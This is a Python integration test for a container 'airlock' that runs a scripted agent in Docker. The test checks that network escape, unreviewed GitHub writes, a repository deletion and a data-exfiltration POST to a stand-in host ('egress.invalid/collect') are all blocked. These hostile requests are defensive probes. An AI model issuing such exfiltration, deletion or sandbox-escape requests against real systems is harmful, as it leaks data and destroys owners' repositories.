"""Actual Docker boundary + actual Permit/Kernel + synthetic host GitHub transport.

This is a containment regression for a fixed reviewed patch. It is neither live
GitHub evidence nor acceptance of an independent useful coding agent.
"""

import base64
import hashlib
import json
import os
import shutil
from pathlib import Path

import httpx
import pytest
from test_github_protected_integration import PATCH, ProviderFixture, reviewed, signed_profile

from actenon_airlock import broker as broker_module
from actenon_airlock import protected as protected_module
from actenon_airlock.github_consequence import project_create
from actenon_airlock.github_runtime import scan_power
from actenon_airlock.manifest import discover
from actenon_airlock.protected import ProtectedBroker, launch_protected
from actenon_airlock.state import State

# This transport is untrusted convenience code. The real host broker supplies all
# authority decisions, credentials and provider I/O. Direct network stays disabled.
AGENT = r"""
import base64
import importlib.util
import json
import os
from pathlib import Path
import socket
import subprocess
import httpx

Path("calculator.py").write_text("def add(a, b):\n    return a + b\n")
subprocess.run(["python3", "-m", "pytest", "-q"], check=True)
subprocess.run(["sh", "-c", "python3 -m compileall -q calculator.py"], check=True)
for args in (["init"], ["config", "user.name", "Contained fixture"],
             ["config", "user.email", "fixture@example.invalid"],
             ["add", "calculator.py", "test_calculator.py", "reviewed.patch"],
             ["-c", "commit.gpgsign=false", "commit", "-m", "Fixture fix"]):
    subprocess.run(["git", *args], check=True)
assert os.getuid() == 10000
for name in ("GITHUB_TOKEN", "GH_TOKEN", "ACTENON_SIGNING_KEY"):
    assert not os.environ.get(name), name
for name in ("/var/run/docker.sock", "/run/docker.sock", ".airlock/local/key.json",
             HOST_SENTINEL, HOST_KEY):
    assert not Path(name).exists(), name
outcomes = {"python_test": "passed", "shell_build": "passed", "local_git": "passed"}
try:
    socket.create_connection(("1.1.1.1", 443), timeout=2)
except OSError:
    outcomes["raw_network"] = "blocked"
else:
    raise AssertionError("raw network escaped")
child = 'import socket; socket.create_connection(("1.1.1.1",443),timeout=2)'
assert subprocess.run(["python3", "-c", child]).returncode != 0
outcomes["child_network"] = "blocked"
spec = importlib.util.spec_from_file_location("relay", "/airlock/contained_agent.py")
relay = importlib.util.module_from_spec(spec)
spec.loader.exec_module(relay)
exchanges = []
class BridgeTransport(httpx.BaseTransport):
    def handle_request(self, request):
        reply = relay.rpc({"kind": "protected-http", "method": request.method,
                           "url": str(request.url), "headers": dict(request.headers),
                           "body": base64.b64encode(request.read()).decode()})
        exchanges.append(reply)
        if not reply["ok"]:
            return httpx.Response(403, json={"error": reply["reason"]})
        response = reply["response"]
        return httpx.Response(response["status"], headers=response["headers"],
                              content=base64.b64decode(response["body"], validate=True))
body = {"branch": "review", "message": "publish reviewed patch",
        "content": base64.b64encode(Path("reviewed.patch").read_bytes()).decode()}
with httpx.Client(transport=BridgeTransport(), trust_env=False) as client:
    response = client.put("https://api.github.com/repos/acme/disposable/contents/patches/fix.patch",
                          json=body)
    assert response.status_code == 201
    assert exchanges[-1]["outcome"] == "AMBIGUOUS"
    outcomes["reviewed_creation"] = "201_AMBIGUOUS"
    response = client.put("https://api.github.com/repos/acme/disposable/contents/patches/fix.patch",
                          json=body, headers={"X-Trace-ID": "fresh-trace-cannot-reset"})
    assert response.status_code == 403
    outcomes["duplicate_with_new_trace"] = "blocked"
    changed = dict(body, content=base64.b64encode(b"unreviewed bytes").decode())
    assert client.put("https://api.github.com/repos/acme/disposable/contents/patches/fix.patch",
                      json=changed).status_code == 403
    outcomes["changed_bytes"] = "blocked"
    assert client.post("https://api.github.com/repos/acme/disposable/issues",
                       json={"title": "unapproved issue"}).status_code == 403
    outcomes["issue_write"] = "blocked"
    assert client.delete("https://api.github.com/repos/acme/disposable").status_code == 403
    outcomes["repo_delete"] = "blocked"
    assert client.post("https://egress.invalid/collect",
                       json={"data": "synthetic-canary"}).status_code == 403
    outcomes["egress"] = "blocked"
assert len(exchanges) == 6
outcomes["git_commit"] = subprocess.check_output(["git", "rev-parse", "HEAD"], text=True).strip()
Path("github-container-outcomes.json").write_text(json.dumps(outcomes, sort_keys=True))
"""


def test_actual_container_github_grant_and_denials(tmp_path, monkeypatch):
    image = os.environ.get("AIRLOCK_TEST_PROTECTED_IMAGE")
    if not image:
        pytest.skip("Actual Docker acceptance runs in its required separate CI job")
    root = tmp_path / "project"
    root.mkdir()
    sentinel = tmp_path / "host-only-sentinel"
    sentinel.write_text("host-only-sentinel-value")
    (root / "calculator.py").write_text("def add(a, b):\n    return a - b\n")
    tests = "from calculator import add\ndef test_add():\n    assert add(2, 3) == 5\n"
    (root / "test_calculator.py").write_text(tests)
    (root / "reviewed.patch").write_bytes(PATCH)
    (root / "main.py").write_text(
        f"HOST_SENTINEL={str(sentinel)!r}\n"
        f"HOST_KEY={str(root / '.airlock/local/key.json')!r}\n" + AGENT
    )
    review = reviewed()
    current = discover(root, env={})
    assert not current["parse_errors"]
    assert scan_power(review) in current["powers"]
    state = State(root)
    # Only the reviewed Contents authority is active; source may propose other powers.
    state.approve(
        {
            **current,
            "powers": [scan_power(review)],
            "protected_github": [signed_profile(review)],
        }
    )
    secret = "host-only-github-fixture-credential"
    monkeypatch.setenv("GITHUB_TOKEN", secret)
    provider = ProviderFixture([review])
    events = []
    settings = {}
    original_init = ProtectedBroker.__init__
    original_claim = broker_module.claim_effect_at_edge
    original_verify = protected_module._verify_container

    def initialize(self, *args, **kwargs):
        original_init(self, *args, **kwargs)
        self.http.close()
        self.http = httpx.Client(transport=httpx.MockTransport(provider), follow_redirects=False)
        original_headers = self._headers

        def headers(values, url, *, materialize):
            if materialize:
                assert events and events[0] == "actual-edge-claim-returned"
                events.append("credential-materialized")
            return original_headers(values, url, materialize=materialize)

        self._headers = headers

    def claim(reference, request, **kwargs):
        result = original_claim(reference, request, **kwargs)
        events.append("actual-edge-claim-returned")
        return result

    def verify_container(docker, identity, *, agent, mounts):
        # Observe the real inspect result after the production verifier passes.
        result = original_verify(docker, identity, agent=agent, mounts=mounts)
        config = docker.json(["inspect", identity])[0]
        host, container = config["HostConfig"], config["Config"]
        environment = dict(item.split("=", 1) for item in container.get("Env", []))
        assert secret not in json.dumps(config)
        assert not any(environment.get(k) for k in ("GITHUB_TOKEN", "GH_TOKEN"))
        settings["agent" if agent else "bridge"] = {
            "container_id": identity,
            "image_id": config["Image"],
            "user": container["User"],
            "host_config": {
                key: host.get(key)
                for key in (
                    "NetworkMode",
                    "ReadonlyRootfs",
                    "Privileged",
                    "CapDrop",
                    "CapAdd",
                    "SecurityOpt",
                    "PidMode",
                    "IpcMode",
                    "PidsLimit",
                    "Memory",
                    "NanoCpus",
                    "Devices",
                    "DeviceRequests",
                    "GroupAdd",
                    "PortBindings",
                )
            },
            "mounts": result["mounts"],
            "environment_names": sorted(environment),
            "github_credential_present": False,
        }
        assert str(root) not in {entry["source"] for entry in result["mounts"].values()}
        assert not any("docker.sock" in entry["source"] for entry in result["mounts"].values())
        return result

    monkeypatch.setattr(ProtectedBroker, "__init__", initialize)
    monkeypatch.setattr(broker_module, "claim_effect_at_edge", claim)
    monkeypatch.setattr(protected_module, "_verify_container", verify_container)
    assert launch_protected(root, ["python3", "main.py"], image=image) == 3
    run = next((state.local / "runs").iterdir())
    workspace = run / "workspace"
    result = json.loads((run / "result.json").read_text())
    assert result["exit_code"] == 0 and result["denials"] == 5
    outcomes = json.loads((workspace / "github-container-outcomes.json").read_text())
    assert outcomes["reviewed_creation"] == "201_AMBIGUOUS"
    assert len(outcomes["git_commit"]) == 40 and (workspace / ".git").is_dir()
    assert (workspace / "test_calculator.py").read_text() == tests
    assert (root / "calculator.py").read_text().endswith("return a - b\n")
    assert sentinel.read_text() == "host-only-sentinel-value"
    assert len(provider.calls) == 4 and len(provider.mutations) == 1
    assert all(request.headers["authorization"] == "Bearer " + secret for request in provider.calls)
    expected_body = json.dumps(
        {
            "branch": review.branch,
            "message": review.message,
            "content": base64.b64encode(PATCH).decode(),
        }
    ).encode()
    projected = project_create("PUT", review.contents_url, expected_body, review)
    assert provider.mutations[0].content == projected.body
    # Host preflight and the subsequent PUT each resolve the same host marker;
    # both are after the single independently verified execution-edge claim.
    assert events == [
        "actual-edge-claim-returned",
        "credential-materialized",
        "credential-materialized",
    ]
    verified = state.verify_receipts()
    assert verified["ok"]
    rows = [item["row"] for item in verified["rows"]]
    allowed = [row for row in rows if row["decision"] == "ALLOW"]
    denied = [row for row in rows if row["decision"] == "DENY"]
    assert len(allowed) == 2 and len(denied) == 5
    authorization, response = allowed
    assert authorization["stage"] == "authorized"
    assert authorization["execution_occurred"] is False
    assert not authorization["credential_released"]
    assert response["stage"] == "response-received"
    assert response["outcome"] == "AMBIGUOUS"
    assert response["execution_occurred"] is None and response["credential_released"]
    assert all(
        row["execution_occurred"] is False and not row["credential_released"] for row in denied
    )
    assert secret not in state.receipts_path.read_text()
    assert settings["agent"]["user"] == "10000:10000"
    assert set(settings["agent"]["mounts"]) == {"/workspace", "/airlock", "/ipc"}
    assert settings["agent"]["mounts"]["/ipc"]["rw"] is False
    assert settings["agent"]["mounts"]["/airlock"]["rw"] is False
    evidence = os.environ.get("AIRLOCK_PROTECTED_EVIDENCE")
    if evidence:
        output = Path(evidence) / "github-container"
        output.mkdir(parents=True, exist_ok=True)
        for name in ("boundary.json", "result.json"):
            shutil.copyfile(run / name, output / name)
        shutil.copyfile(workspace / "github-container-outcomes.json", output / "outcomes.json")
        shutil.copyfile(state.receipts_path, output / "receipts.jsonl")
        shutil.copyfile(state.path / "public-key.json", output / "public-key.json")
        shutil.copyfile(state.path / "approved.json", output / "approved.json")
        (output / "observed-container-settings.json").write_text(
            json.dumps(settings, indent=2) + "\n"
        )
        (output / "provider-fixture-requests.json").write_text(
            json.dumps(
                [
                    {
                        "method": request.method,
                        "url": str(request.url),
                        "body_sha256": hashlib.sha256(request.content).hexdigest(),
                    }
                    for request in provider.calls
                ],
                indent=2,
            )
            + "\n"
        )
        (output / "verification.json").write_text(
            json.dumps(
                {
                    "actual_docker_containment": True,
                    "actual_permit_kernel": True,
                    "receipt_signature_chain_ok": verified["ok"],
                    "verified_receipts": verified["verified"],
                    "credential_after_actual_edge_claim": True,
                    "provider_fixture": True,
                    "live_github_truth": False,
                    "external_coding_agent_acceptance": False,
                    "completion_or_exactly_once_claim": False,
                    "creation_outcome": "AMBIGUOUS",
                    "denials": len(denied),
                },
                indent=2,
            )
            + "\n"
        )
